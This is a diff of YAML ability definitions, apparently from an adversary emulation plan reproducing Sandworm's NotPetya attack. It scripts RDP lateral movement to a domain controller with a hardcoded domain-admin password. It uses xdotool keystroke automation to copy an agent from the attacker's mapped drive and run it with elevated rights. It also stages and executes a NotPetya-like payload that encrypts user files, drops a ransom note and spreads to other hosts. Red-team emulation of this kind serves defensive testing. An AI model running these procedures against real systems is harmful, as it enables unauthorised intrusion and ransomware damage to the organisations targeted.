+    name: "Remote Services: Remote Desktop Protocol"
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 18.A.1-2
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp +clipboard /u:WORKGROUP\\#{domain.admin.name} /p:"#{domain.admin.password}" /v:#{dc.target.host} /drive:X,./sw_tools /cert-ignore
+
+  input_arguments:
+    dc.target.host:
+      description: The hostname or IPv4 address of the domain controller for lateral movement.
+      type: string
+      default: 10.0.1.4
+    domain.admin.name:
+      description: The name of the domain admin account for lateral movement to the domain controller.
+      type: string
+      default: patreides
+    domain.admin.password:
+      description: The password of the domain admin account for lateral movement to the domain controller.
+      type: string
+      default: ebqMB7DmM81QVUqpf7XI
+
+- id: 58cf78ef-e777-4de8-aeaa-8cc8349be6f7
+  name: Download and Execute Agent for Lateral Movement (Arrakis)
+  description: |
+    Downloads a new agent executable and executes it on the domain controller over RDP.
+    This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),
+    since the RDP connection will be from the attacker's machine.
+    Requires xdotool to be installed on the running machine.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_command_and_control
+  procedure_step: 18.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 30;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:#{dc.target.host}");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool windowactivate --sync "$rdp_window" key Super_L;
+          sleep 5; xdotool windowactivate --sync "$rdp_window" type --delay 200 "powershell.exe";
+          sleep 5; xdotool windowactivate --sync "$rdp_window" key --clearmodifiers --delay 200 Control_L+Shift_L+Return;
+          sleep 10; xdotool windowactivate --sync "$rdp_window" key Left;
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 'copy \\TSCLIENT\X\perfc.exe .\perfc.exe';
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 3; xdotool windowactivate --sync "$rdp_window" type --delay 200 '.\perfc.exe';
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 30;
+        timeout: 180
+
+  input_arguments:
+    dc.target.host:
+      description: The hostname or IPv4 address of the domain controller for lateral movement.
+      type: string
+      default: 10.0.1.4
+
+- id: ba30987a-efc8-46a6-b0ec-94f4cc53dbff
+  name: Sandworm Download NotPetya
+  description: |
+    Sandworm downloads NotPetya (perfc.dat) using powershell.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 18.A.3-4
+  platforms:
+    windows:
+      psh:
+        command: |
+          copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat;
+          dir C:\Windows\perfc.dat;
+        cleanup: |
+          if (Test-Path "C:\Windows\perfc.dat") { rm C:\Windows\perfc.dat };
+
+# Step 19 - Deploy NotPetya
+
+- id: 9a39f75e-215d-4ef5-b505-ce81be74d58f
+  name: Sandworm Executes NotPetya (perfc.dat)
+  description: |
+    Sandworm executes NotPetya (perfc.dat). NotPetya creates a scheduled task called "Restart" that reboots the
+    workstation and is executed at the end of the program.
+    NotPetya encrypts files under C:\Users (recursive) via AES-128.
+    NotPetya drops a ransom note in C:\README.txt.
+    NotPetya copies and executes itself on other hosts.
+  tactic: impact
+  technique:
+    attack_id: T1486
+    name: Data Encrypted for Impact
+  cti_source: "https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"
+  procedure_group: procedure_impact
+  procedure_step: 19.A
+  platforms:
+    windows:
+      psh:
+        timeout: 300
+        command: |
+          rundll32.exe C:\Windows\perfc.dat,"#1"
+        cleanup: |
+          if (Test-Path "C:\README.txt") { rm C:\README.txt };
+          schtasks /delete /tn Restart /F;
+
+- id: a86485c0-772d-4159-aa6f-5c2a9bb13ac8
+  name: Terminate RDP Session to Domain Controller (Arrakis)
+  description: |
+    End the RDP session to the domain controller.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection originates from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 19.A
+  platforms:
+    linux:
+      proc:
+        command: |
+          pkill xfreerdp
